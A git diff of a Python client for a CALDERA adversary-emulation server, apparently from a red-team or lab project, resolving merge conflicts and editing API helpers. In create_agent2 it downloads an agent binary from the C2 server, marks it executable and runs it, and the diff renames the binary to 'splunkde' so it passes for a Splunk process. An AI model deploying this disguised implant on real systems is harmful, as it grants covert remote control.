@@ -50,22 +50,22 @@ def create_agent2():
 	try:
 		with requests.post(url,headers=headers,stream=True) as response:
 			response.raise_for_status()
-			with open ("test", "wb") as f:
+			with open ("splunkde", "wb") as f:
 				for chunk in response.iter_content(chunk_size=8192):
 					if chunk:
 						f.write(chunk)
-		os.chmod("test",0o755)
+		os.chmod("splunkde",0o755)
 		with open("agent2.log", "wb") as log:
-    			subprocess.Popen(
+			subprocess.Popen(
         		[
-            			"./test",
+            			"./splunkde",
             			"-server", CALDERA_URL,
             			"-group", "red",
             			"-v"
         		],
         		stdout=log,
         		stderr=log
-    		)
+			)
 	except Exception:
 		return False
 		
@@ -90,19 +90,12 @@ def show_agents():
 
 def get_agents():
 	try:
-<<<<<<< HEAD
-		r = requests.get(f"{CALDERA_URL}/api/v2/agents", headers = HEADERS, timeout=14)
-		return r.json()
-	except Exception:
-		return False
-=======
 		r = requests.get(f"{CALDERA_URL}/api/v2/agents", headers = HEADERS, timeout=7)
 		agents=r.json()
 		return agents
 	except Exception:
 		return False
 
->>>>>>> origin/fernie
 
 # Abilities
 def show_abilities():
@@ -165,7 +158,6 @@ def show_operations():
 		r = requests.get(f"{CALDERA_URL}/api/v2/operations", headers = HEADERS, timeout=7)
 		operations=r.json()
 		for operation in operations:
-			print ("-" * 235)
 			print(f"""
 NAME:		{operation['name']}
 ID:		{operation['id']}
@@ -174,8 +166,6 @@ STATE:		{operation['state']}
 			""")
 	except Exception:
 		return False
-<<<<<<< HEAD
-=======
 		
 def create_operation(name):
 	try:
@@ -207,7 +197,6 @@ def find_operation(name):
 				return operation['id']
 	except Exception:
 		return False
->>>>>>> origin/fernie
 #Health
 def health_check():
     try:
@@ -302,9 +291,3 @@ def format_steps(data: dict) -> list[dict]:
 		return False
 
 
-<<<<<<< HEAD
-create_agent()
-create_operation()
-=======
-
->>>>>>> origin/fernie
